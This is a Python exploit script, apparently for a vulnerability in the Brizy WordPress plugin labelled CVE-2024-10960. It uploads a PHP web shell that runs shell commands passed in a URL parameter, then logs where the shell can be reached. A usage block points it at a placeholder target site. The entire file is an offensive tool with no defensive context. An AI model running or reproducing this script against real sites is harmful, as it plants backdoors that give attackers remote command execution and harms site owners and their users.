import requests
import logging
import time

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")
logger = logging.getLogger(__name__)

def run_exploit(target_url):
    """
    Exploit the Brizy plugin vulnerability in WordPress (CVE-2024-10960) to gain RCE.

    Args:
        target_url (str): The target WordPress URL (e.g., http://example.com)

    Returns:
        bool: True if RCE was successful, False otherwise.
    """
    shell = {
        "file": ("shell.php", "<?php echo shell_exec($_GET['cmd']); ?>", "application/x-php")
    }

    url = f"{target_url}/wp-content/plugins/brizy/public/editor-assets/ajax/upload.php"
    try:
        # Send the POST request to upload the malicious PHP shell
        r = requests.post(url, files=shell, timeout=10)  # Added timeout for better control
        if r.status_code == 200:
            # Check if the response contains a success indicator
            if "success" in r.text:
                shell_url = f"{target_url}/wp-content/uploads/brizy/shell.php"
                logger.info(f"[+] Brizy RCE possible at {shell_url}")
                return True
            else:
                logger.warning(f"[!] Upload failed or server response doesn't indicate success.")
        else:
            logger.error(f"[!] Failed to upload shell. Status code: {r.status_code}")
    except requests.exceptions.RequestException as e:
        logger.error(f"[!] Request failed: {e}")
    except Exception as e:
        logger.error(f"[!] Unexpected error: {e}")
    
    return False

# Example Usage:
if __name__ == "__main__":
    target_ip = "http://targetwebsite.com"  # Replace with the actual target URL
    result = run_exploit(target_ip)
    if result:
        logger.info(f"Exploit successful. Shell uploaded to: {target_ip}/wp-content/uploads/brizy/shell.php")
    else:
        logger.info("Exploit failed.")
